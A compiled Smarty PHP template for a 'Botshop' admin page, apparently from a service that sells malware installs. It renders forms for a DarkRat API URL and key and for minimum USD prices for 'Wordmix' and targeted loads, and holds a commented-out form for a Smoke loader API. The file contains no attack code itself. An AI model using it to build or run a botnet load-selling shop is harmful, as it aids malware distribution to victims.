<?php
/* Smarty version 3.1.32, created on 2019-08-17 18:05:45
  from 'D:\xampp\htdocs\templates\v1\Admin_main\botshop.tpl' */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.32',
  'unifunc' => 'content_5d5825d976e441_96343195',
  'has_nocache_code' => false,
  'file_dependency' => 
  array (
    'dea18f9d19a191eede43c142650df7ce68c232d6' => 
    array (
      0 => 'D:\\xampp\\htdocs\\templates\\v1\\Admin_main\\botshop.tpl',
      1 => 1566057943,
      2 => 'file',
    ),
  ),
  'includes' => 
  array (
    'file:header.tpl' => 1,
    'file:nav.tpl' => 1,
    'file:footer.tpl' => 1,
  ),
),false)) {
function content_5d5825d976e441_96343195 (Smarty_Internal_Template $_smarty_tpl) {
$_smarty_tpl->_subTemplateRender("file:header.tpl", $_smarty_tpl->cache_id, $_smarty_tpl->compile_id, 0, $_smarty_tpl->cache_lifetime, array('title'=>'foo'), 0, false);
$_smarty_tpl->_subTemplateRender("file:nav.tpl", $_smarty_tpl->cache_id, $_smarty_tpl->compile_id, 0, $_smarty_tpl->cache_lifetime, array('title'=>'foo'), 0, false);
?>

<div id="content-wrapper">
    <div class="container-fluid">

        <ol class="breadcrumb">
            <li class="breadcrumb-item">
                <a href="/admin">Admin</a>
            </li>
            <li class="breadcrumb-item active">Botshop</li>
        </ol>


        <div class="card mb-3">
            <div class="card-header">
                <i class="fas fa-table"></i>
                DarkRat API</div>
            <div class="card-body">
                <form method="post">
                    <label>API URL</label>
                    <input type="text" placeholder="API URL" value="<?php echo $_smarty_tpl->tpl_vars['apiInfo']->value['api_url'];?>
" class="form-control" name="api_url">
                    <br>
                    <label>API KEY</label>
                    <input type="text" placeholder="API KEY" value="<?php echo $_smarty_tpl->tpl_vars['apiInfo']->value['api_key'];?>
" class="form-control" name="api_key">
                    <br>
                    <label>Min Amount USD for Wordmix</label>
                    <input type="text" placeholder="API KEY" value="<?php echo $_smarty_tpl->tpl_vars['apiInfo']->value['min_loads'];?>
" class="form-control" name="min_loads">
                    <br>
                    <label>Min Amount USD for Targeting</label>
                    <input type="text" placeholder="API KEY" value="<?php echo $_smarty_tpl->tpl_vars['apiInfo']->value['min_loads_target'];?>
" class="form-control" name="min_loads_target">
                    <br>

                    <br>
                    <input type="submit" value="Save" class="form-control" name="update_darkrat_api">
                </form>
        </div>

<!--
            <div class="card mb-3">
                <div class="card-header">
                    <i class="fas fa-table"></i>
                    Smoke API</div>
                <div class="card-body">
                    <form method="post">
                        <input type="text" placeholder="API URL" value="<?php echo $_smarty_tpl->tpl_vars['apiInfoSmoke']->value['api_url'];?>
" class="form-control" name="api_url">
                        <br>

                        <input type="text" placeholder="API KEY" value="<?php echo $_smarty_tpl->tpl_vars['apiInfoSmoke']->value['api_key'];?>
" class="form-control" name="api_key">
                        <br>
                        <br>
                        <input type="submit" value="Save" class="form-control" name="update_smoke_api">
                    </form>
                </div>
-->

    </div>
</div>
<?php $_smarty_tpl->_subTemplateRender("file:footer.tpl", $_smarty_tpl->cache_id, $_smarty_tpl->compile_id, 0, $_smarty_tpl->cache_lifetime, array(), 0, false);
}
}
